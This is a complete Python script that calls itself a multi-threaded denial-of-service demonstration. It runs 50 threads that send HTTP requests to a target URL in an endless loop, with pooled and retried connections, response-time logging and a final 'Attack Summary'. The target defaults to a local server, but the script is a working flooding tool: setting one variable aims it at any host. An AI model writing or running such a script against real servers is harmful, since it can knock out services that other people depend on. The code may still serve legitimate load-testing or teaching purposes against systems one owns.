import logging
import requests
import threading
import time
import statistics
import sys
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configure colored logging
try:
    import colorlog
    
    handler = colorlog.StreamHandler()
    handler.setFormatter(colorlog.ColoredFormatter(
        '%(log_color)s%(asctime)s - %(message)s',
        log_colors={
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'red,bg_white',
        }
    ))
    
    logger = colorlog.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = [handler]
except ImportError:
    # Fallback to standard logging if colorlog is not installed
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    logger = logging.getLogger()
    print("For colored logs, install colorlog: pip install colorlog")

TARGET_URL = "http://127.0.0.1:8000"  # Change this to your local server's port

# Statistics tracking
request_count = 0
response_times = []
summary_interval = 10  # Show summary every N requests
lock = threading.Lock()  # Lock for thread-safe operations on shared variables

# Configure session with connection pooling
def create_session():
    session = requests.Session()
    
    # Configure retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    
    # Configure adapter with larger pool size and longer keep-alive
    adapter = HTTPAdapter(
        pool_connections=100,  # Increase connection pool size
        pool_maxsize=100,      # Increase max size per host
        max_retries=retry_strategy
    )
    
    # Mount adapter to both http and https
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

# Create thread-local storage for sessions
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = create_session()
    return thread_local.session

def send_requests():
    global request_count
    global response_times
    
    # Get thread-local session
    session = get_session()
    
    while True:
        try:
            start_time = time.time()
            response = session.get(TARGET_URL)
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                request_count += 1
                response_times.append(response_time)
                
                # Only log detailed info at intervals to reduce spam
                if request_count % summary_interval == 0:
                    avg_time = statistics.mean(response_times[-summary_interval:])
                    max_time = max(response_times[-summary_interval:])
                    
                    logger.info(f"Request #{request_count} | Status: {response.status_code} | "
                                f"Last: {response_time:.4f}s | Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
                    
                    # Clear old response times to prevent memory buildup during long runs
                    if len(response_times) > 1000:
                        response_times = response_times[-100:]

            # Add a small delay to prevent overwhelming the system
            time.sleep(0.01)

        except requests.exceptions.RequestException as e:
            logger.error(f"Request error: {e}")
            time.sleep(0.5)  # Back off on errors
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(0.5)  # Back off on errors

def main():
    print(f"Starting multi-threaded DoS demonstration against {TARGET_URL}")
    print("Press Ctrl+C to stop the attack\n")

    # Launch multiple threads
    NUM_THREADS = 50  # Adjust as needed
    threads = []

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True  # Set as daemon so they will exit when the main thread exits
        thread.start()
        threads.append(thread)

    try:
        # Keep the main thread alive but responsive to keyboard interrupts
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Calculate final statistics
        with lock:
            avg_time = statistics.mean(response_times) if response_times else 0
            max_time = max(response_times) if response_times else 0
        
        print("\n" + "="*50)
        print(f"Attack Summary:")
        print(f"Total Requests: {request_count}")
        print(f"Average Response Time: {avg_time:.4f}s")
        print(f"Maximum Response Time: {max_time:.4f}s")
        print("="*50)
        sys.exit(0)

if __name__ == "__main__":
    main()
